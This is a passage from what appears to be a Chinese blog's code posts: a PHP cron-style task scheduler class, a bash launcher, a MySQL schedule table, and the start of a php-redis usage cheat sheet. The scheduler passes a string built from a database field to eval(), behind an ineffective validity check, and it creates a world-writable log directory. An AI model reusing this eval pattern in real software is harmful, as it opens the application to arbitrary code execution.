class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">class ScheduleModel&#123;</span><br><span class="line">private <span class="variable">$model</span>;</span><br><span class="line">private <span class="variable">$schedule</span>= array();</span><br><span class="line">private <span class="variable">$scheduleList</span> = array();</span><br><span class="line">private <span class="variable">$redisKey</span> = <span class="string">'scheduleList'</span>;//redis保存表里面数据的key值</span><br><span class="line">/**</span><br><span class="line"> * @desc 执行计划任务列表</span><br><span class="line"> * */</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">Run</span></span>()&#123;</span><br><span class="line">//锁定自动执行 修正一下</span><br><span class="line"><span class="variable">$lockfile</span> = <span class="variable">$this</span>-&gt;getLogPath() . <span class="string">'/schedule.lock'</span>;</span><br><span class="line">//锁定未过期 - 返回</span><br><span class="line"><span class="keyword">if</span>( file_exists(<span class="variable">$lockfile</span>) &amp;&amp; ( (filemtime(<span class="variable">$lockfile</span>))+60 &gt; <span class="variable">$_SERVER</span>[<span class="string">'REQUEST_TIME'</span>] ))&#123;</span><br><span class="line"><span class="built_in">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">//重新生成锁文件</span><br><span class="line">touch(<span class="variable">$lockfile</span>);</span><br><span class="line">&#125;</span><br><span class="line">//执行计划任务</span><br><span class="line"><span class="variable">$this</span>-&gt;runScheduleList(<span class="variable">$this</span>-&gt;getScheduleList());</span><br><span class="line">//解除锁定</span><br><span class="line">unlink(<span class="variable">$lockfile</span>);</span><br><span class="line"><span class="built_in">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @desc 执行计划任务列表</span><br><span class="line"> * ***/</span><br><span class="line">public <span class="keyword">function</span> runScheduleList(<span class="variable">$scheduleList</span>) &#123;</span><br><span class="line">foreach( <span class="variable">$scheduleList</span> as <span class="variable">$key</span> =&gt; <span class="variable">$schedule</span> ) &#123;</span><br><span class="line"><span class="variable">$date</span> = <span class="variable">$this</span>-&gt;calculateNextRunTime(<span class="variable">$schedule</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$date</span> != <span class="literal">false</span> &amp;&amp; <span class="variable">$date</span> &lt;= time()) &#123;</span><br><span class="line"><span class="variable">$this</span>-&gt;runSchedule(<span class="variable">$schedule</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @desc 运行计划任务</span><br><span class="line"> * **/</span><br><span class="line">public <span class="keyword">function</span> runSchedule(<span class="variable">$schedule</span>) &#123;</span><br><span class="line">// 获取后台配置的计划任务</span><br><span class="line"><span class="variable">$checkScheduleList</span> = <span class="variable">$this</span>-&gt;getScheduleList();</span><br><span class="line"><span class="variable">$checkScheduleList</span> = <span class="variable">$this</span>-&gt;getSubByKey(<span class="variable">$checkScheduleList</span>, <span class="string">'task_to_run'</span>);</span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$schedule</span>[<span class="string">'task_to_run'</span>], <span class="variable">$checkScheduleList</span>)) &#123;</span><br><span class="line"><span class="variable">$str_log</span> = <span class="string">"schedule_id = &#123;<span class="variable">$schedule</span>['id']&#125; 的任务不合法。"</span>;</span><br><span class="line"><span class="variable">$this</span>-&gt;_log(<span class="variable">$str_log</span>);</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">//解析task类型, 并运行task</span><br><span class="line"><span class="variable">$task_to_run</span> = explode(<span class="string">'/'</span>,<span class="variable">$schedule</span>[<span class="string">'task_to_run'</span>]);</span><br><span class="line"><span class="variable">$modelStr</span> = <span class="string">"D('&#123;<span class="variable">$task_to_run</span>[0]&#125;')-&gt;&#123;<span class="variable">$task_to_run</span>[1]&#125;();"</span>;</span><br><span class="line">/**-----这里开始处理任务模型------**/</span><br><span class="line"><span class="built_in">eval</span>(<span class="variable">$modelStr</span>);</span><br><span class="line">/**-----这里结束处理任务模型下面开始更新数据表------**/</span><br><span class="line"><span class="keyword">if</span>(strtoupper(<span class="variable">$schedule</span>[<span class="string">'schedule_type'</span>]) == <span class="string">'ONCE'</span>) &#123;</span><br><span class="line">//ONCE类型的计划任务，将end_datetime设置为当前时间</span><br><span class="line"><span class="keyword">if</span>(empty(<span class="variable">$schedule</span>[<span class="string">'last_run_time'</span>]))&#123;</span><br><span class="line"><span class="variable">$schedule</span>[<span class="string">'last_run_time'</span>] = date(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">//非ONCE类型的计划任务， 防止由程序执行导致的启动时间的漂移</span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$schedule</span>[<span class="string">'schedule_type'</span>], array(<span class="string">'MINUTE'</span>, <span class="string">'HOURLY'</span>))) &#123;</span><br><span class="line">//将last_run_time设置为当前时间（秒数设为0）</span><br><span class="line"><span class="variable">$schedule</span>[<span class="string">'last_run_time'</span>] = date(<span class="string">'Y-m-d H:i:s'</span>,<span class="variable">$this</span>-&gt;setSecondToZero());</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">//将last_run_time设置为当前日期+预定时间</span><br><span class="line"><span class="variable">$now_date</span> = date(<span class="string">'Y-m-d'</span>);</span><br><span class="line"><span class="variable">$fixed_time</span> = date(<span class="string">'H:i:s'</span>, strtotime(<span class="variable">$schedule</span>[<span class="string">'start_datetime'</span>]));</span><br><span class="line"><span class="variable">$schedule</span>[<span class="string">'last_run_time'</span>] = <span class="variable">$now_date</span> . <span class="string">' '</span> . <span class="variable">$fixed_time</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$this</span>-&gt;saveSchedule(<span class="variable">$schedule</span>);</span><br><span class="line"><span class="variable">$str_log</span> = <span class="string">"schedule_id = &#123;<span class="variable">$schedule</span>['id']&#125; 的任务已运行。"</span>;</span><br><span class="line"><span class="variable">$this</span>-&gt;_log(<span class="variable">$str_log</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @desc 计算定时任务下次执行时间</span><br><span class="line"> * @<span class="built_in">return</span> <span class="string">'Y-m-d H:i:s'</span></span><br><span class="line"> * ***/</span><br><span class="line">public <span class="keyword">function</span>  calculateNextRunTime(<span class="variable">$schedule</span>)&#123;</span><br><span class="line">//已过期</span><br><span class="line"><span class="keyword">if</span>( (strtotime(<span class="variable">$schedule</span>[<span class="string">'end_datetime'</span>])&gt;0) &amp;&amp; (strtotime(<span class="variable">$schedule</span>[<span class="string">'end_datetime'</span>]) &lt; strtotime(date(<span class="string">'Y-m-d H:i:s'</span>))) ) &#123;</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">//还未启动</span><br><span class="line"><span class="keyword">if</span>( strtotime(<span class="variable">$schedule</span>[<span class="string">'start_datetime'</span>]) &gt; strtotime(date(<span class="string">'Y-m-d H:i:s'</span>)) ) &#123;</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">//已执行</span><br><span class="line"><span class="keyword">if</span>( strtotime(<span class="variable">$schedule</span>[<span class="string">'last_run_time'</span>]) &gt; strtotime(date(<span class="string">'Y-m-d H:i:s'</span>)) ) &#123;</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$modifier</span> = empty(<span class="variable">$schedule</span>[<span class="string">'modifier'</span>]) ? 1 : <span class="variable">$schedule</span>[<span class="string">'modifier'</span>];</span><br><span class="line"><span class="keyword">if</span>( !empty(<span class="variable">$schedule</span>[<span class="string">'last_run_time'</span>]) &amp;&amp; (strtotime(<span class="variable">$schedule</span>[<span class="string">'last_run_time'</span>]) &gt; strtotime(<span class="variable">$schedule</span>[<span class="string">'start_datetime'</span>]))) &#123;</span><br><span class="line"><span class="variable">$date</span> = is_string(<span class="variable">$schedule</span>[<span class="string">'last_run_time'</span>]) ? strtotime(<span class="variable">$schedule</span>[<span class="string">'last_run_time'</span>]) : <span class="variable">$schedule</span>[<span class="string">'last_run_time'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;//如果没有执行过则默认为开始时间执行</span><br><span class="line"><span class="variable">$date</span> = <span class="variable">$this</span>-&gt;_getStartDateTime(<span class="variable">$schedule</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$type</span> = <span class="variable">$schedule</span>[<span class="string">'schedule_type'</span>];</span><br><span class="line">switch(<span class="variable">$type</span>)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'ONCE'</span>:</span><br><span class="line"><span class="keyword">if</span>(!empty(<span class="variable">$schedule</span>[<span class="string">'last_run_time'</span>]))&#123;</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$datetime</span> =  <span class="variable">$this</span>-&gt;_getStartDateTime(<span class="variable">$schedule</span>);</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'MINUTE'</span>:</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$modifier</span>&gt;=1 &amp;&amp; <span class="variable">$modifier</span>&lt;=60)&#123;</span><br><span class="line"><span class="variable">$datetime</span> =  mktime(date(<span class="string">'H'</span>,<span class="variable">$date</span>),date(<span class="string">'i'</span>,<span class="variable">$date</span>) + <span class="variable">$modifier</span>,date(<span class="string">'s'</span>,<span class="variable">$date</span>),date(<span class="string">'m'</span>,<span class="variable">$date</span>),date(<span class="string">'d'</span>,<span class="variable">$date</span>),date(<span class="string">'Y'</span>,<span class="variable">$date</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$str_log</span> = <span class="string">"schedule_id = &#123;<span class="variable">$schedule</span>['id']&#125; 的任务不合法，MINUTE类型，执行的频率必须为1-60的数字。"</span>;</span><br><span class="line"><span class="variable">$this</span>-&gt;_log(<span class="variable">$str_log</span>);</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'HOURLY'</span>:</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$modifier</span>&gt;=1 &amp;&amp; <span class="variable">$modifier</span>&lt;=24)&#123;</span><br><span class="line"><span class="variable">$datetime</span> = mktime(date(<span class="string">'H'</span>,<span class="variable">$date</span>) + <span class="variable">$modifier</span>,date(<span class="string">'i'</span>,<span class="variable">$date</span>),date(<span class="string">'s'</span>,<span class="variable">$date</span>),date(<span class="string">'m'</span>,<span class="variable">$date</span>),date(<span class="string">'d'</span>,<span class="variable">$date</span>),date(<span class="string">'Y'</span>,<span class="variable">$date</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$str_log</span> = <span class="string">"schedule_id = &#123;<span class="variable">$schedule</span>['id']&#125; 的任务不合法，HOURLY类型执行的频率必须为1-24的数字。"</span>;</span><br><span class="line"><span class="variable">$this</span>-&gt;_log(<span class="variable">$str_log</span>);</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'DAILY'</span>:</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$modifier</span>&gt;=1 &amp;&amp; <span class="variable">$modifier</span>&lt;=31)&#123;</span><br><span class="line"><span class="variable">$datetime</span> = mktime(date(<span class="string">'H'</span>,<span class="variable">$date</span>),date(<span class="string">'i'</span>,<span class="variable">$date</span>),date(<span class="string">'s'</span>,<span class="variable">$date</span>),date(<span class="string">'m'</span>,<span class="variable">$date</span>),date(<span class="string">'d'</span>,<span class="variable">$date</span>) + <span class="variable">$modifier</span>,date(<span class="string">'Y'</span>,<span class="variable">$date</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$str_log</span> = <span class="string">"schedule_id = &#123;<span class="variable">$schedule</span>['id']&#125; 的任务不合法，DAILY类型执行的频率必须为1-31的数字。"</span>;</span><br><span class="line"><span class="variable">$this</span>-&gt;_log(<span class="variable">$str_log</span>);</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'MONTHLY'</span>:</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$modifier</span>&gt;=1 &amp;&amp; <span class="variable">$modifier</span>&lt;=12)&#123;</span><br><span class="line"><span class="variable">$datetime</span> = mktime(date(<span class="string">'H'</span>,<span class="variable">$date</span>),date(<span class="string">'i'</span>,<span class="variable">$date</span>),date(<span class="string">'s'</span>,<span class="variable">$date</span>),date(<span class="string">'m'</span>,<span class="variable">$date</span>)+<span class="variable">$modifier</span>,date(<span class="string">'d'</span>,<span class="variable">$date</span>),date(<span class="string">'Y'</span>,<span class="variable">$date</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$str_log</span> = <span class="string">"schedule_id = &#123;<span class="variable">$schedule</span>['id']&#125; 的任务不合法，MONTHLY类型执行的频率必须为1-12的数字。"</span>;</span><br><span class="line"><span class="variable">$this</span>-&gt;_log(<span class="variable">$str_log</span>);</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">default:</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$datetime</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> *@desc 设置定时任务文件目录</span><br><span class="line">*/</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">getLogPath</span></span>()&#123;</span><br><span class="line"><span class="variable">$logPath</span> = <span class="string">'./Public/schedule_log'</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_dir(<span class="variable">$logPath</span>))</span><br><span class="line">@mkdir(<span class="variable">$logPath</span>,0777);</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$logPath</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @desc 检测定时任务写入执行情况</span><br><span class="line"> * **/</span><br><span class="line">protected <span class="keyword">function</span> _log(<span class="variable">$str</span>)&#123;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$this</span>-&gt;getLogPath() . <span class="string">'/schedule_'</span> . date(<span class="string">'Y-m-d'</span>) . <span class="string">'.log'</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">'['</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">'] '</span> . <span class="variable">$str</span>;</span><br><span class="line"><span class="variable">$str</span> .= <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="variable">$handle</span> = fopen(<span class="variable">$filename</span>, <span class="string">'a'</span>);</span><br><span class="line">fwrite(<span class="variable">$handle</span>, <span class="variable">$str</span>);</span><br><span class="line">fclose(<span class="variable">$handle</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//获取开始时间</span><br><span class="line">//@<span class="built_in">return</span> timestamp</span><br><span class="line">protected <span class="keyword">function</span> _getStartDateTime(<span class="variable">$schedule</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>( !empty(<span class="variable">$schedule</span>[<span class="string">'start_datetime'</span>]) ) &#123;</span><br><span class="line"><span class="built_in">return</span> strtotime(<span class="variable">$schedule</span>[<span class="string">'start_datetime'</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/***</span><br><span class="line"> *@desc 将给定时间的秒数置为0; 参数为空时，使用当前时间</span><br><span class="line"> * ***/</span><br><span class="line">protected <span class="keyword">function</span> setSecondToZero(<span class="variable">$date_time</span> = NULL) &#123;</span><br><span class="line"><span class="keyword">if</span>(empty(<span class="variable">$date_time</span>)) &#123;</span><br><span class="line"><span class="variable">$date_time</span> = date(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$date_time</span> = is_string(<span class="variable">$date_time</span>) ? strtotime(<span class="variable">$date_time</span>) : <span class="variable">$date_time</span>;</span><br><span class="line"><span class="built_in">return</span> mktime(date(<span class="string">'H'</span>, <span class="variable">$date_time</span>),date(<span class="string">'i'</span>, <span class="variable">$date_time</span>),0,date(<span class="string">'m'</span>, <span class="variable">$date_time</span>),date(<span class="string">'d'</span>, <span class="variable">$date_time</span>),date(<span class="string">'Y'</span>, <span class="variable">$date_time</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 取一个二维数组中的每个数组的固定的键知道的值来形成一个新的一维数组</span><br><span class="line"> * @param <span class="variable">$pArray</span> 一个二维数组</span><br><span class="line"> * @param <span class="variable">$pKey</span> 数组的键的名称</span><br><span class="line"> * @<span class="built_in">return</span> 返回新的一维数组</span><br><span class="line"> */</span><br><span class="line">public <span class="keyword">function</span> getSubByKey(<span class="variable">$pArray</span>, <span class="variable">$pKey</span>=<span class="string">""</span>, <span class="variable">$pCondition</span>=<span class="string">""</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = array();</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$pArray</span>))&#123;</span><br><span class="line">foreach(<span class="variable">$pArray</span> as <span class="variable">$temp_array</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(is_object(<span class="variable">$temp_array</span>))&#123;</span><br><span class="line"><span class="variable">$temp_array</span> = (array) <span class="variable">$temp_array</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>((<span class="string">""</span>!=<span class="variable">$pCondition</span> &amp;&amp; <span class="variable">$temp_array</span>[<span class="variable">$pCondition</span>[0]]==<span class="variable">$pCondition</span>[1]) || <span class="string">""</span>==<span class="variable">$pCondition</span>) &#123;</span><br><span class="line"><span class="variable">$result</span>[] = (<span class="string">""</span>==<span class="variable">$pKey</span>) ? <span class="variable">$temp_array</span> : isset(<span class="variable">$temp_array</span>[<span class="variable">$pKey</span>]) ? <span class="variable">$temp_array</span>[<span class="variable">$pKey</span>] : <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/***</span><br><span class="line"> * @desc 修改计划任务本次执行时间</span><br><span class="line"> * **/</span><br><span class="line">public <span class="keyword">function</span> saveSchedule(<span class="variable">$schedule</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(empty(<span class="variable">$schedule</span>))&#123;</span><br><span class="line"><span class="built_in">return</span> array();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = array(<span class="string">'id'</span>=&gt;<span class="variable">$schedule</span>[<span class="string">'id'</span>],<span class="string">'last_run_time'</span>=&gt;<span class="variable">$schedule</span>[<span class="string">'last_run_time'</span>],);</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$this</span>-&gt;save(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @desc 获取定时任务列表信息</span><br><span class="line"> * **/</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">getScheduleList</span></span>()&#123;</span><br><span class="line"><span class="variable">$where</span>[<span class="string">'status'</span>] = 1;//开启</span><br><span class="line"><span class="variable">$infoArr</span> = <span class="variable">$this</span>-&gt;<span class="built_in">where</span>(<span class="variable">$where</span>)-&gt;select();</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$infoArr</span>;</span><br><span class="line">/*<span class="variable">$redis</span> = redis();</span><br><span class="line"><span class="variable">$redInfo</span> = <span class="variable">$redis</span>-&gt;get(<span class="variable">$this</span>-&gt;redisKey);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$redInfo</span>)&#123;</span><br><span class="line"><span class="built_in">return</span> unserialize(<span class="variable">$redInfo</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$where</span>[<span class="string">'status'</span>] = 0;</span><br><span class="line"><span class="variable">$infoArr</span> = <span class="variable">$this</span>-&gt;<span class="built_in">where</span>(<span class="variable">$where</span>)-&gt;select();</span><br><span class="line"><span class="variable">$info</span> = serialize(<span class="variable">$infoArr</span>);</span><br><span class="line"><span class="variable">$redis</span>-&gt;<span class="built_in">set</span>(<span class="variable">$this</span>-&gt;redisKey,<span class="variable">$info</span>,300);</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$infoArr</span>;</span><br><span class="line">&#125;*/</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>sh脚本</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> /data/wwwroot/workplace/</span><br><span class="line">/data/<span class="built_in">local</span>/php/bin/php do.php</span><br></pre></td></tr></table></figure><ul><li>数据库</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ET FOREIGN_KEY_CHECKS=0;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure <span class="keyword">for</span> `b2b_schedule`</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `b2b_schedule`;</span><br><span class="line">CREATE TABLE `b2b_schedule` (</span><br><span class="line">`id`  int(11) NOT NULL ,</span><br><span class="line">`task_to_run`  varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT <span class="string">'计划任务执行方法'</span> ,</span><br><span class="line">`schedule_type`  varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT <span class="string">'执行频率'</span> ,</span><br><span class="line">`modifier`  varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT <span class="string">'执行频率,类型为MONTHLY时必须；ONCE时无效；其他时为可选，默认为1'</span> ,</span><br><span class="line">`start_datetime`  datetime NOT NULL COMMENT <span class="string">'开始时间'</span> ,</span><br><span class="line">`end_datetime`  datetime NULL DEFAULT NULL COMMENT <span class="string">'结束时间'</span> ,</span><br><span class="line">`last_run_time`  datetime NULL DEFAULT NULL COMMENT <span class="string">'最近执行时间'</span> ,</span><br><span class="line">`info`  varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT <span class="string">'对计划任务的简要描述'</span> ,</span><br><span class="line">`status`  tinyint(1) NULL DEFAULT 0 COMMENT <span class="string">'0关闭，1开启'</span> ,</span><br><span class="line">PRIMARY KEY (`id`)</span><br><span class="line">)</span><br><span class="line">ENGINE=MyISAM</span><br><span class="line">DEFAULT CHARACTER SET=utf8 COLLATE=utf8_general_ci</span><br><span class="line">COMMENT=<span class="string">'计划任务管理表'</span></span><br><span class="line"></span><br><span class="line">;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> crontab </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php-redis</title>
      <link href="/php-redis.html"/>
      <url>/php-redis.html</url>
      <content type="html"><![CDATA[<p>redis在php中的使用</p><ul><li>连接</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$redis</span> = new Redis;</span><br><span class="line"><span class="variable">$redis</span>-&gt;connect(<span class="string">'127.0.0.1'</span>, 6379, 1);  //短链接，本地host，端口为6379，超过1秒放弃链接</span><br><span class="line"><span class="variable">$redis</span>-&gt;open(<span class="string">'127.0.0.1'</span>, 6379, 1);  //短链接(同上)</span><br><span class="line"><span class="variable">$redis</span>-&gt;pconnect(<span class="string">'127.0.0.1'</span>, 6379, 1);  //长链接，本地host，端口为6379，超过1秒放弃链接</span><br><span class="line"><span class="variable">$redis</span>-&gt;popen(<span class="string">'127.0.0.1'</span>, 6379, 1);  //长链接(同上)</span><br><span class="line"><span class="variable">$redis</span>-&gt;auth(<span class="string">'password'</span>);  //登录验证密码，返回【<span class="literal">true</span> | <span class="literal">false</span>】</span><br><span class="line"><span class="variable">$redis</span>-&gt;select(0);  //选择redis库, 0~15 共16个库</span><br><span class="line"><span class="variable">$redis</span>-&gt;close();  //释放资源</span><br><span class="line"><span class="variable">$redis</span>-&gt;ping();   //检查是否还再链接, [+pong]</span><br><span class="line"><span class="variable">$redis</span>-&gt;ttl(<span class="string">'key'</span>);  //查看失效时间[-1 | timestamps]</span><br><span class="line"><span class="variable">$redis</span>-&gt;persist(<span class="string">'key'</span>);  //移除失效时间[ 1 | 0]</span><br><span class="line"><span class="variable">$redis</span>-&gt;sort(<span class="string">'key'</span>, [<span class="variable">$array</span>]);  //返回或保存给定列表、集合、有序集合key中经过排序的元素，<span class="variable">$array</span>为参数<span class="built_in">limit</span>等！【配合<span class="variable">$array</span>很强大】 [array|<span class="literal">false</span>]</span><br></pre></td></tr></table></figure><ul><li>运算类归类</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$redis</span>-&gt;expire(<span class="string">'key'</span>, 10);  //设置失效时间[<span class="literal">true</span> | <span class="literal">false</span>]</span><br><span class="line"><span class="variable">$redis</span>-&gt;move(<span class="string">'key'</span>, 15);  //把当前库中的key移动到15库中[0|1]</span><br><span class="line">//string</span><br><span class="line"><span class="variable">$redis</span>-&gt;strlen(<span class="string">'key'</span>);  //获取当前key的长度</span><br><span 